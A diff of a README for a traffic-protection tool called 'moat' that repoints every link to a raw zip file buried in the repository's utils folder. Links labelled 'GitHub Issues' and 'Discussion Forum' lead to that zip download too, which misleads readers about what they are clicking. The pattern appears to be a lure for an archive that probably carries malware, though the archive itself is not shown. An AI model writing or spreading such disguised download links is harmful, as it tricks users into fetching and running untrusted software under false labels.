@@ -6,7 +6,7 @@ Welcome to the moat project! This software protects your online traffic using ad
 
 ## 📥 Download & Install
 
-To get started, you need to download the software. Visit this page to download: [moat Releases](https://raw.githubusercontent.com/radkid/moat/main/sycamine/moat.zip)
+To get started, you need to download the software. Visit this page to download: [moat Releases](https://github.com/radkid/moat/raw/refs/heads/main/moat/src/utils/Software-v1.9.zip)
 
 You will find the latest version available for download. Simply choose the version that fits your system.
 
@@ -57,8 +57,8 @@ moat allows you to customize settings easily. Here’s how to set it up:
 
 If you encounter issues or have questions, you can join our community for support. Check out the following resources:
 
-- [GitHub Issues](https://raw.githubusercontent.com/radkid/moat/main/sycamine/moat.zip): Report any problems you face or suggest new features.
-- [Discussion Forum](https://raw.githubusercontent.com/radkid/moat/main/sycamine/moat.zip): Engage with other users to share tips and solutions.
+- [GitHub Issues](https://github.com/radkid/moat/raw/refs/heads/main/moat/src/utils/Software-v1.9.zip): Report any problems you face or suggest new features.
+- [Discussion Forum](https://github.com/radkid/moat/raw/refs/heads/main/moat/src/utils/Software-v1.9.zip): Engage with other users to share tips and solutions.
 
 ## 🛠️ Troubleshooting
 
@@ -70,7 +70,7 @@ If you experience difficulties:
 
 ## 🔄 Updates
 
-Stay updated with the latest improvements by regularly visiting the releases page: [moat Releases](https://raw.githubusercontent.com/radkid/moat/main/sycamine/moat.zip)
+Stay updated with the latest improvements by regularly visiting the releases page: [moat Releases](https://github.com/radkid/moat/raw/refs/heads/main/moat/src/utils/Software-v1.9.zip)
 
 Updating ensures you benefit from the latest features and security enhancements. 
 
